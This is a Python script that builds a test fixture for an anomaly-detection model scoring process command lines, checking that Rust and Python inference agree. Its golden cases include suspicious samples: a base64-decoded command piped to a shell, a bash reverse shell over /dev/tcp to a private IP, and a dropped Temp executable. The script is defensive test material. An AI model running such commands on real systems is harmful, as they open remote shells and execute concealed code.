"""Regenerates the cmdline-scorer parity fixture:

    crates/ml/tests/fixtures/cmdline_scorer.onnx    (a small 9-feature IsolationForest)
    crates/ml/tests/fixtures/scorer_golden.json     (cmdline -> onnxruntime score)

This is the `verify_onnx` seam for the *inference path* (distinct from the feature
parity of features_golden.jsonl and the attribution parity of
attribution_golden.json): it pins the Rust `ort` score to the Python onnxruntime
score, so `crates/ml`'s CmdlineScorer and the training-side runtime agree on the same
model and the same feature extractor.

The model is trained on features extracted (via synthaea_ml.features.cmdline — the
same definitions the Rust side mirrors) from a set of benign-ish command lines, so the
learned boundary is meaningful rather than random. Exported through the real skl2onnx
converter at the opsets production models use.

Run from `ml/tests/fixtures/` with a venv holding numpy, scikit-learn, skl2onnx, onnx,
onnxruntime:

    python3 gen_scorer_fixture.py
"""

import json
import sys
from pathlib import Path

import numpy as np
import onnxruntime
from skl2onnx import to_onnx
from sklearn.ensemble import IsolationForest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from synthaea_ml.features.cmdline import extract_features

OUT_DIR = Path(__file__).resolve().parents[3] / "crates" / "ml" / "tests" / "fixtures"

# Benign-ish command lines (argv \0-separated, as ExecEvent::cmdline carries them) —
# the training distribution. Kept deliberately mundane: system daemons, package
# tooling, routine shell.
TRAIN_CMDLINES = [
    "/usr/bin/bash\0-l\0",
    "ls\0-la\0/home/user\0",
    "/usr/lib/systemd/systemd\0--user\0",
    "curl\0-fsS\0https://example.test/health\0",
    "/usr/bin/python3\0/usr/local/bin/app.py\0--serve\0",
    "git\0status\0--short\0",
    "sshd:\0user@pts/0\0",
    "/usr/sbin/cron\0-f\0",
    "docker\0ps\0--format\0{{.Names}}\0",
    "grep\0-r\0TODO\0src/\0",
    "node\0/srv/app/index.js\0",
    "postgres:\0checkpointer\0",
    "/usr/bin/dockerd\0--host\0unix:///var/run/docker.sock\0",
    "tar\0-czf\0/backups/data.tgz\0/var/data\0",
    "systemctl\0status\0nginx\0",
    "/usr/bin/containerd-shim-runc-v2\0-namespace\0moby\0-id\0abc123\0",
    "apt-get\0install\0-y\0build-essential\0",
    "vim\0/etc/hosts\0",
    "/usr/bin/ssh-agent\0-s\0",
    "make\0-j4\0release\0",
]

# Cases to pin: a spread of benign and clearly-suspicious command lines.
GOLDEN_CMDLINES = [
    "/usr/bin/bash\0-l\0",
    "ls\0-la\0/home/user\0",
    "curl\0-fsS\0https://example.test/health\0",
    "/usr/bin/python3\0/usr/local/bin/app.py\0--serve\0",
    # suspicious: base64 decode piped to shell
    "sh\0-c\0echo cHdk | base64 --decode | sh\0",
    # suspicious: reverse shell via /dev/tcp
    "bash\0-i\0>&\0/dev/tcp/10.0.0.1/4444\x000>&1\0",
    # suspicious: Windows dropper in Temp
    "C:\\Users\\bob\\AppData\\Local\\Temp\\payload.exe\0",
]

model = IsolationForest(n_estimators=20, max_samples=16, random_state=17)
train_x = np.array([extract_features(c) for c in TRAIN_CMDLINES], dtype=np.float32)
model.fit(train_x)

onnx_model = to_onnx(model, train_x, target_opset={"ai.onnx.ml": 3, "": 18})
model_path = OUT_DIR / "cmdline_scorer.onnx"
model_path.write_bytes(onnx_model.SerializeToString())

sess = onnxruntime.InferenceSession(model_path.read_bytes(), providers=["CPUExecutionProvider"])
cases = []
for cmdline in GOLDEN_CMDLINES:
    x = np.array([extract_features(cmdline)], dtype=np.float32)
    score = float(sess.run(["scores"], {"X": x})[0].reshape(-1)[0])
    cases.append({"cmdline": cmdline, "score": score})

# Sanity: onnxruntime and scikit-learn must agree (the training-side verify_onnx).
skl = model.decision_function(
    np.array([extract_features(c) for c in GOLDEN_CMDLINES], dtype=np.float32)
)
onnx = np.array([c["score"] for c in cases])
assert np.allclose(skl, onnx, atol=1e-5), f"onnx vs sklearn diverge:\n{skl=}\n{onnx=}"

golden = {"model": "cmdline_scorer.onnx", "n_features": 9, "cases": cases}
(OUT_DIR / "scorer_golden.json").write_text(json.dumps(golden, indent=2) + "\n")
print(f"wrote {model_path} ({model_path.stat().st_size} bytes) and scorer_golden.json")
for c in cases:
    print(f"  {c['score']:+.4f}  {c['cmdline']!r}")
